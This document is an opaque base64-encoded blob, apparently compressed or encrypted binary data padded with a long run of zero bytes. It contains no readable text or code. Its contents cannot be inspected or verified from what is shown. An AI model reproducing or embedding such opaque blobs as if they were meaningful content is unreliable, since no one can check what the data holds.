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AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA